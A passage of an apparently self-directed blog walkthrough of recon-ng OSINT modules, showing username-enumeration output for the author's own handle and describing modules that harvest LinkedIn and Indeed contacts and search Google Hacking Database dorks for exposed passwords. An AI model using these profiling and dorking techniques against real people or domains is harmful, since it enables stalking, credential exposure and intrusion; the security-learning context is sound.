-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][dev_diver] &gt; run
-</span><span class='line'>[*] Checking Github...
-</span><span class='line'>[*] Github username found - (https://api.github.com/users/chousensha)
-</span><span class='line'>
-</span><span class='line'>  +-------------------------------------------------------------------+
-</span><span class='line'>  |                               Github                              |
-</span><span class='line'>  +-------------------------------------------------------------------+
-</span><span class='line'>  | Resource    | Github                                              |
-</span><span class='line'>  | User Name   | chousensha                                          |
-</span><span class='line'>  | Profile URL | https://github.com/chousensha                       |
-</span><span class='line'>  | Avatar URL  | https://avatars.githubusercontent.com/u/5703557?v=3 |
-</span><span class='line'>  | Location    |                                                     |
-</span><span class='line'>  | Company     |                                                     |
-</span><span class='line'>  | Blog URL    | http://chousensha.github.io/                        |
-</span><span class='line'>  | Email       |                                                     |
-</span><span class='line'>  | Bio         |                                                     |
-</span><span class='line'>  | Followers   | 2                                                   |
-</span><span class='line'>  | ID          | 5703557                                             |
-</span><span class='line'>  | Joined      | 2013-10-16                                          |
-</span><span class='line'>  | Updated     | 2016-04-29                                          |
-</span><span class='line'>  +-------------------------------------------------------------------+
-</span><span class='line'>
-</span><span class='line'>[*] Checking Bitbucket...
-</span><span class='line'>[*] Bitbucket username not found.
-</span><span class='line'>[*] Checking SourceForge...
-</span><span class='line'>[*] Sourceforge username not found.
-</span><span class='line'>[*] Checking CodePlex...
-</span><span class='line'>[*] CodePlex username not found.
-</span><span class='line'>[*] Checking Gitorious...
-</span><span class='line'>[*] Gitorious username not found.
-</span><span class='line'>
-</span><span class='line'>-------
-</span><span class='line'>SUMMARY
-</span><span class='line'>-------
-</span><span class='line'>[*] 1 total (1 new) contacts found.</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><p>Linkedin Contact Crawler &ndash; Harvests contact information from linkedin.com by parsing the link(s) given and adding the info to
-the &lsquo;contacts&rsquo; table.</p></li>
-<li><p>Linkedin Profile Crawler &ndash; Harvests profiles from linkedin.com by visting the given link(s), crawling the &ldquo;Viewers of this
-profile also viewed&rdquo;, parsing the pages, and adding new profiles to the &lsquo;profiles&rsquo; table</p></li>
-<li><p>NameChk.com Username Validator &ndash; Leverages NameChk.com to validate the existance of usernames on specific web sites and updates the
-&lsquo;profiles&rsquo; table with the results.</p></li>
-</ul>
-
-
-<p>Good for recon but also for checking if how unique is your l33t handle:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-<span class='line-number'>101</span>
-<span class='line-number'>102</span>
-<span class='line-number'>103</span>
-<span class='line-number'>104</span>
-<span class='line-number'>105</span>
-<span class='line-number'>106</span>
-<span class='line-number'>107</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][namechk] &gt; run
-</span><span class='line'>[*] Retrieving site data...
-</span><span class='line'>
-</span><span class='line'>----------
-</span><span class='line'>CHOUSENSHA
-</span><span class='line'>----------
-</span><span class='line'>[*] Wordpress: Available.
-</span><span class='line'>[*] Reddit: Available.
-</span><span class='line'>[*] Blogger: Available.
-</span><span class='line'>[*] GooglePlus: Available.
-</span><span class='line'>[*] Ebay: Available.
-</span><span class='line'>[*] Twitch: Available.
-</span><span class='line'>[*] Instagram: Available.
-</span><span class='line'>[*] Twitter: User exists!
-</span><span class='line'>[*] Facebook: User exists!
-</span><span class='line'>[*] Slack: Available.
-</span><span class='line'>[*] PayPal: Available.
-</span><span class='line'>[*] Pinterest: Available.
-</span><span class='line'>[*] Vine: User exists!
-</span><span class='line'>[*] Github: User exists!
-</span><span class='line'>[*] Basecamp: Available.
-</span><span class='line'>[*] Flickr: Available.
-</span><span class='line'>[*] Pandora: Available.
-</span><span class='line'>[*] Spotify: Available.
-</span><span class='line'>[*] YouTube: User exists!
-</span><span class='line'>[*] MySpace: Available.
-</span><span class='line'>[*] Steam: Available.
-</span><span class='line'>[*] Flipboard: Available.
-</span><span class='line'>[*] OkCupid: Available.
-</span><span class='line'>[*] UStream: Available.
-</span><span class='line'>[*] Vimeo: Available.
-</span><span class='line'>[*] Etsy: User exists!
-</span><span class='line'>[*] BitBucket: Available.
-</span><span class='line'>[*] SoundCloud: Available.
-</span><span class='line'>[*] 500px: Available.
-</span><span class='line'>[*] CashMe: Available.
-</span><span class='line'>[*] Meetup: Available.
-</span><span class='line'>[*] DailyMotion: Available.
-</span><span class='line'>[*] About.me: User exists!
-</span><span class='line'>[*] ProductHunt: Available.
-</span><span class='line'>[*] Disqus: User exists!
-</span><span class='line'>[*] Medium: User exists!
-</span><span class='line'>[*] Behance: Available.
-</span><span class='line'>[*] Imgur: Available.
-</span><span class='line'>[*] Bit.ly: User exists!
-</span><span class='line'>[*] Fanpop: Available.
-</span><span class='line'>[*] Cafe Mom: Available.
-</span><span class='line'>[*] Instructables: Available.
-</span><span class='line'>[*] Photobucket: Available.
-</span><span class='line'>[*] Good Reads: Available.
-</span><span class='line'>[*] deviantART: Available.
-</span><span class='line'>[*] Tumblr: Available.
-</span><span class='line'>[*] Gravatar: Available.
-</span><span class='line'>[*] Venmo: User exists!
-</span><span class='line'>[*] Keybase: Available.
-</span><span class='line'>[*] StumbleUpon: User exists!
-</span><span class='line'>[*] Kongregate: User exists!
-</span><span class='line'>[*] LiveJournal: Available.
-</span><span class='line'>[*] Yelp: User exists!
-</span><span class='line'>[*] Codecademy: Available.
-</span><span class='line'>[*] Foursquare: Available.
-</span><span class='line'>[*] Team Treehouse: Available.
-</span><span class='line'>[*] AngelList: Available.
-</span><span class='line'>[*] Viddler: Available.
-</span><span class='line'>[*] tsu: Available.
-</span><span class='line'>[*] last.fm: Available.
-</span><span class='line'>[*] Technorati: Available.
-</span><span class='line'>[*] Aviary: User exists!
-</span><span class='line'>[*] Fotolog: User exists!
-</span><span class='line'>[*] Slideshare: Available.
-</span><span class='line'>[*] Blinklist: Available.
-</span><span class='line'>[*] Tripit: User exists!
-</span><span class='line'>[*] GogoBot: Available.
-</span><span class='line'>[*] Flavors.me: Available.
-</span><span class='line'>[*] BuzzFeed: Available.
-</span><span class='line'>[*] TripAdvisor: Available.
-</span><span class='line'>[*] blip.fm: Available.
-</span><span class='line'>[*] Dribbble: Available.
-</span><span class='line'>[*] Geeklist: User exists!
-</span><span class='line'>[*] Papaly: Available.
-</span><span class='line'>[*] wishlistr: Available.
-</span><span class='line'>[*] Vk: Available.
-</span><span class='line'>[*] Pastebin: Available.
-</span><span class='line'>[*] Coinbase: Available.
-</span><span class='line'>[*] iFunny: Available.
-</span><span class='line'>[*] Roblox: User exists!
-</span><span class='line'>[*] XFire: Available.
-</span><span class='line'>[*] Witty: User exists!
-</span><span class='line'>[*] Wikipedia: Available.
-</span><span class='line'>[*] Hackernews: User exists!
-</span><span class='line'>[*] StreamMe: Available.
-</span><span class='line'>[*] Abouto: Available.
-</span><span class='line'>[*] qmpeople: Available.
-</span><span class='line'>[*] Fiverr: Available.
-</span><span class='line'>[*] Plenty Of Fish: Available.
-</span><span class='line'>[*] Voat: User exists!
-</span><span class='line'>[*] Trakt: Available.
-</span><span class='line'>[*] IFTTT: Available.
-</span><span class='line'>[*] Crokes: User exists!
-</span><span class='line'>[*] Tracky: Available.
-</span><span class='line'>[*] GetSatisfaction: Available.
-</span><span class='line'>[*] Ello: User exists!
-</span><span class='line'>
-</span><span class='line'>-------
-</span><span class='line'>SUMMARY
-</span><span class='line'>-------
-</span><span class='line'>[*] 24 total (24 new) profiles found.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Hmm, quite a few other &ldquo;challengers&rdquo;.</p>
-
-<ul>
-<li>OSINT HUMINT Profile Collector &ndash; Takes each username from the profiles table and searches a variety of web sites for those users.</li>
-</ul>
-
-
-<p>This one checks 191 sites for the username, here we go:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-<span class='line-number'>101</span>
-<span class='line-number'>102</span>
-<span class='line-number'>103</span>
-<span class='line-number'>104</span>
-<span class='line-number'>105</span>
-<span class='line-number'>106</span>
-<span class='line-number'>107</span>
-<span class='line-number'>108</span>
-<span class='line-number'>109</span>
-<span class='line-number'>110</span>
-<span class='line-number'>111</span>
-<span class='line-number'>112</span>
-<span class='line-number'>113</span>
-<span class='line-number'>114</span>
-<span class='line-number'>115</span>
-<span class='line-number'>116</span>
-<span class='line-number'>117</span>
-<span class='line-number'>118</span>
-<span class='line-number'>119</span>
-<span class='line-number'>120</span>
-<span class='line-number'>121</span>
-<span class='line-number'>122</span>
-<span class='line-number'>123</span>
-<span class='line-number'>124</span>
-<span class='line-number'>125</span>
-<span class='line-number'>126</span>
-<span class='line-number'>127</span>
-<span class='line-number'>128</span>
-<span class='line-number'>129</span>
-<span class='line-number'>130</span>
-<span class='line-number'>131</span>
-<span class='line-number'>132</span>
-<span class='line-number'>133</span>
-<span class='line-number'>134</span>
-<span class='line-number'>135</span>
-<span class='line-number'>136</span>
-<span class='line-number'>137</span>
-<span class='line-number'>138</span>
-<span class='line-number'>139</span>
-<span class='line-number'>140</span>
-<span class='line-number'>141</span>
-<span class='line-number'>142</span>
-<span class='line-number'>143</span>
-<span class='line-number'>144</span>
-<span class='line-number'>145</span>
-<span class='line-number'>146</span>
-<span class='line-number'>147</span>
-<span class='line-number'>148</span>
-<span class='line-number'>149</span>
-<span class='line-number'>150</span>
-<span class='line-number'>151</span>
-<span class='line-number'>152</span>
-<span class='line-number'>153</span>
-<span class='line-number'>154</span>
-<span class='line-number'>155</span>
-<span class='line-number'>156</span>
-<span class='line-number'>157</span>
-<span class='line-number'>158</span>
-<span class='line-number'>159</span>
-<span class='line-number'>160</span>
-<span class='line-number'>161</span>
-<span class='line-number'>162</span>
-<span class='line-number'>163</span>
-<span class='line-number'>164</span>
-<span class='line-number'>165</span>
-<span class='line-number'>166</span>
-<span class='line-number'>167</span>
-<span class='line-number'>168</span>
-<span class='line-number'>169</span>
-<span class='line-number'>170</span>
-<span class='line-number'>171</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][profiler] &gt; run
-</span><span class='line'>[*] Retrieving https://raw.githubusercontent.com/WebBreacher/WhatsMyName/master/web_accounts_list.json...
-</span><span class='line'>
-</span><span class='line'>  Looking Up Data For: Chousensha
-</span><span class='line'>  -------------------------------
-</span><span class='line'>[*] Checking: about.me
-</span><span class='line'>[*] Checking: AdultFriendFinder
-</span><span class='line'>[*] Checking: Matchdoctor
-</span><span class='line'>[*] Checking: AngelList
-</span><span class='line'>[*] Checking: aNobil
-</span><span class='line'>[*] Checking: ask.fm
-</span><span class='line'>[*] Checking: Atlassian
-</span><span class='line'>[*] Checking: Atlassian Self-Signup
-</span><span class='line'>[*] Checking: AudioBoom
-</span><span class='line'>[*] Checking: authorSTREAM
-</span><span class='line'>[*] Checking: badoo
-</span><span class='line'>[*] Checking: Bitbucket
-</span><span class='line'>[*] Checking: BLIP.fm
-</span><span class='line'>[*] Checking: Black Planet
-</span><span class='line'>[*] Checking: Blogmarks
-</span><span class='line'>[*] Checking: Blogspot
-</span><span class='line'>[*] Checking: BodyBuilding.com
-</span><span class='line'>[*] Checking: Break
-</span><span class='line'>[*] Checking: Bugcrowd
-</span><span class='line'>[*] Checking: cafemom
-</span><span class='line'>[*] Checking: CarDomain
-</span><span class='line'>[*] Checking: cHEEZburger
-</span><span class='line'>[*] Checking: CodePlex
-</span><span class='line'>[*] Checking: CoderStats
-</span><span class='line'>[*] Checking: COLOURlovers
-</span><span class='line'>[*] Checking: Conferize
-</span><span class='line'>[*] Checking: copytaste
-</span><span class='line'>[*] Checking: cruiseMates
-</span><span class='line'>[*] Checking: Dailymotion
-</span><span class='line'>[*] Checking: Delicious
-</span><span class='line'>[*] Checking: DeviantArt
-</span><span class='line'>[*] Checking: diigo
-</span><span class='line'>[*] Checking: DIY
-</span><span class='line'>[*] Checking: eBay
-</span><span class='line'>[*] Checking: EightBit
-</span><span class='line'>[*] [profile] chousensha - CoderStats (http://coderstats.net/github/chousensha/)
-</span><span class='line'>[*] Checking: Engadget
-</span><span class='line'>[*] Checking: EPORNER
-</span><span class='line'>[*] Checking: Etsy
-</span><span class='line'>[*] Checking: facebook.com
-</span><span class='line'>[*] Checking: families.com
-</span><span class='line'>[*] Checking: fanpop
-</span><span class='line'>[*] Checking: FFFFOUND!
-</span><span class='line'>[*] Checking: Fiverr
-</span><span class='line'>[*] Checking: Flickr
-</span><span class='line'>[*] Checking: Foodspotting
-</span><span class='line'>[*] Checking: Fotolog
-</span><span class='line'>[*] Checking: Foursquare
-</span><span class='line'>[*] Checking: freesound
-</span><span class='line'>[*] Checking: FriendFinder-X
-</span><span class='line'>[*] Checking: FunnyOrDie
-</span><span class='line'>[*] Checking: Garmin connect
-</span><span class='line'>[*] Checking: GeekGrade
-</span><span class='line'>[*] Checking: Geocaching
-</span><span class='line'>[*] Checking: GETItON
-</span><span class='line'>[*] Checking: GitHub
-</span><span class='line'>[*] Checking: gogobot
-</span><span class='line'>[*] Checking: goodreads
-</span><span class='line'>[*] Checking: Gravatar
-</span><span class='line'>[*] Checking: howaboutwe
-</span><span class='line'>[*] Checking: HubPages
-</span><span class='line'>[*] Checking: I-am-pregnant
-</span><span class='line'>[*] Checking: IFTTT
-</span><span class='line'>[*] [profile] chousensha - GitHub (https://api.github.com/users/chousensha)
-</span><span class='line'>[*] Checking: ImageShack
-</span><span class='line'>[*] Checking: imgur
-</span><span class='line'>[*] Checking: InsaneJournal
-</span><span class='line'>[*] Checking: Instagram
-</span><span class='line'>[*] Checking: instructables
-</span><span class='line'>[*] Checking: Internet Archive
-</span><span class='line'>[*] Checking: interpals
-</span><span class='line'>[*] Checking: Keybase
-</span><span class='line'>[*] Checking: Klear
-</span><span class='line'>[*] Checking: Klout
-</span><span class='line'>[*] Checking: Kongregate
-</span><span class='line'>[*] Checking: Lanyrd
-</span><span class='line'>[*] Checking: Last.fm
-</span><span class='line'>[*] Checking: LibraryThing
-</span><span class='line'>[*] Checking: LinkedIn
-</span><span class='line'>[*] Checking: LiveJasmin
-</span><span class='line'>[*] Checking: Marketing Land
-</span><span class='line'>[*] Checking: mate1
-</span><span class='line'>[*] [profile] chousensha - Kongregate (http://www.kongregate.com/accounts/chousensha)
-</span><span class='line'>[*] Checking: Medium
-</span><span class='line'>[*] Checking: Meetzur
-</span><span class='line'>[*] Checking: Microsoft Technet Community
-</span><span class='line'>[*] Checking: Mixcloud
-</span><span class='line'>[*] Checking: Mixcrate
-</span><span class='line'>[*] Checking: Mixlr
-</span><span class='line'>[*] Checking: Mod DB
-</span><span class='line'>[*] Checking: Muck Rack
-</span><span class='line'>[*] [profile] chousensha - Internet Archive (http://archive.org/search.php?query=chousensha)
-</span><span class='line'>[*] Checking: MyBuilder.com
-</span><span class='line'>[*] Checking: MyFitnessPal
-</span><span class='line'>[*] Checking: MyLot
-</span><span class='line'>[*] Checking: Myspace
-</span><span class='line'>[*] Checking: netvibes
-</span><span class='line'>[*] Checking: Newsvine
-</span><span class='line'>[*] Checking: Overcast Network
-</span><span class='line'>[*] Checking: Photoblog
-</span><span class='line'>[*] Checking: PhotoBucket
-</span><span class='line'>[*] Checking: PictureTrail
-</span><span class='line'>[*] Checking: PinkBike
-</span><span class='line'>[*] Checking: Pinterest
-</span><span class='line'>[*] Checking: Playlists.net
-</span><span class='line'>[*] Checking: Plurk
-</span><span class='line'>[*] Checking: POF
-</span><span class='line'>[*] Checking: Porn.com
-</span><span class='line'>[*] Checking: Pornhub
-</span><span class='line'>[*] Checking: PSNProfiles
-</span><span class='line'>[*] Checking: raptr
-</span><span class='line'>[*] Checking: Readability
-</span><span class='line'>[*] Checking: Reunion.com
-</span><span class='line'>[*] Checking: scratch
-</span><span class='line'>[*] Checking: Security Street
-</span><span class='line'>[*] Checking: SEOClerks
-</span><span class='line'>[*] Checking: setlist.fm
-</span><span class='line'>[*] Checking: Shopcade
-</span><span class='line'>[*] Checking: singlemuslim
-</span><span class='line'>[*] Checking: slideshare
-</span><span class='line'>[*] Checking: SmugMug
-</span><span class='line'>[*] Checking: smule
-</span><span class='line'>[*] Checking: snooth
-</span><span class='line'>[*] Checking: Soup
-</span><span class='line'>[*] Checking: Speaker Deck
-</span><span class='line'>[*] Checking: sporcle
-</span><span class='line'>[*] Checking: Steam
-</span><span class='line'>[*] Checking: stupidcancer
-</span><span class='line'>[*] Checking: TF2 Backpack Examiner
-</span><span class='line'>[*] Checking: theguardian
-</span><span class='line'>[*] Checking: thesixtyone
-</span><span class='line'>[*] Checking: tribe
-</span><span class='line'>[*] Checking: tripadvisor
-</span><span class='line'>[*] Checking: Tripit
-</span><span class='line'>[*] Checking: tumblr
-</span><span class='line'>[*] Checking: Twitter
-</span><span class='line'>[*] Checking: untappd
-</span><span class='line'>[*] Checking: uSTREAM
-</span><span class='line'>[*] Checking: viddler
-</span><span class='line'>[*] Checking: VideoLike
-</span><span class='line'>[*] Checking: vidme
-</span><span class='line'>[*] Checking: Vimeo
-</span><span class='line'>[*] Checking: Vine
-</span><span class='line'>[*] Checking: VisualizeUs
-</span><span class='line'>[*] Checking: Voices.com
-</span><span class='line'>[*] Checking: Wanelo
-</span><span class='line'>[*] Checking: wattpad
-</span><span class='line'>[*] Checking: WeeWorld
-</span><span class='line'>[*] Checking: wishlistr
-</span><span class='line'>[*] [profile] chousensha - VideoLike (http://videolike.org/video/chousensha)
-</span><span class='line'>[*] Checking: Wikipedia
-</span><span class='line'>[*] [profile] chousensha - Twitter (https://twitter.com/chousensha)
-</span><span class='line'>[*] Checking: WordPress
-</span><span class='line'>[*] Checking: WordPress Support
-</span><span class='line'>[*] Checking: Xanga
-</span><span class='line'>[*] Checking: Xbox Gamertag
-</span><span class='line'>[*] Checking: xHamster
-</span><span class='line'>[*] Checking: XVIDEOS
-</span><span class='line'>[*] Checking: YouTube
-</span><span class='line'>[*] Checking: Zooppa
-</span><span class='line'>[*] [profile] chousensha - YouTube (https://www.youtube.com/user/chousensha/videos)
-</span><span class='line'>
-</span><span class='line'>-------
-</span><span class='line'>SUMMARY
-</span><span class='line'>-------
-</span><span class='line'>[*] 7 total (5 new) profiles found.</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><p>Twitter Handles &ndash; Searches Twitter for users that mentioned, or were mentioned by, the given handle.</p></li>
-<li><p>Github Code Enumerator &ndash; Uses the Github API to enumerate repositories and gists owned by a Github user. Updates the
-&lsquo;repositories&rsquo; table with the results.</p></li>
-<li><p>Github Commit Searcher &ndash; Uses the Github API to gather user profiles from repository commits. Updates the &lsquo;profiles&rsquo; table
-with the results.</p></li>
-<li><p>Github Gist Searcher &ndash; Uses the Github API to download and search Gists for possible information disclosures. Updates the
-&lsquo;vulnerabilities&rsquo; table with the results</p></li>
-<li><p>Github Dork Analyzer &ndash; Uses the Github API to search for possible vulnerabilites in source code by leveraging Github Dorks
-and the &lsquo;repo&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
-<li><p>Indeed Resume Crawl &ndash; Crawls Indeed.com for contacts and resumes. Adds name, title, and location to the contacts table and
-a link to the resume in the profiles table. Can only harvest the first 1,000 results. Result set
-changes, so running the same crawl mutiple times can produce new contacts. If the PAST_EMPS option
-is set to true, the module will crawl both current and past employees. Given a keyword, the module
-will only harvest contacts whose resumes contain the keyword. (e.g. Linux Admin)</p></li>
-<li><p>Meta Data Extractor &ndash; Searches for files associated with the provided domain(s) and extracts any contact related metadata</p></li>
-<li><p>HackerTarget Lookup &ndash; Uses the HackerTarget.com API to find host names. Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
-<li><p>ThreatCrowd DNS lookup &ndash; Leverages the ThreatCrowd passive DNS API to discover hosts/subdomains.</p></li>
-<li><p>Google Hacking Database &ndash; Searches for possible vulnerabilites in a domain by leveraging the Google Hacking Database (GHDB)
-and the &lsquo;site&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
-</ul>
-
-
-<p>This module is massive! Basically, you get Google dorks inside Recon-ng!</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][ghdb] &gt; show info
-</span><span class='line'>
-</span><span class='line'>      Name: Google Hacking Database
-</span><span class='line'>      Path: modules/recon/domains-vulnerabilities/ghdb.py
-</span><span class='line'>    Author: Tim Tomes (@LaNMaSteR53)
-</span><span class='line'>
-</span><span class='line'>Description:
-</span><span class='line'>  Searches for possible vulnerabilites in a domain by leveraging the Google Hacking Database (GHDB)
-</span><span class='line'>  and the 'site' search operator. Updates the 'vulnerabilities' table with the results.
-</span><span class='line'>
-</span><span class='line'>Options:
-</span><span class='line'>  Name                                 Current Value  Required  Description
-</span><span class='line'>  -----------------------------------  -------------  --------  -----------
-</span><span class='line'>  DORKS                                               no        file containing an alternate list of Google dorks
-</span><span class='line'>  GHDB_ADVISORIES_AND_VULNERABILITIES  False          yes       enable/disable the 1996 dorks in this category
-</span><span class='line'>  GHDB_ERROR_MESSAGES                  False          yes       enable/disable the 93 dorks in this category
-</span><span class='line'>  GHDB_FILES_CONTAINING_JUICY_INFO     False          yes       enable/disable the 366 dorks in this category
-</span><span class='line'>  GHDB_FILES_CONTAINING_PASSWORDS      False          yes       enable/disable the 199 dorks in this category
-</span><span class='line'>  GHDB_FILES_CONTAINING_USERNAMES      False          yes       enable/disable the 17 dorks in this category
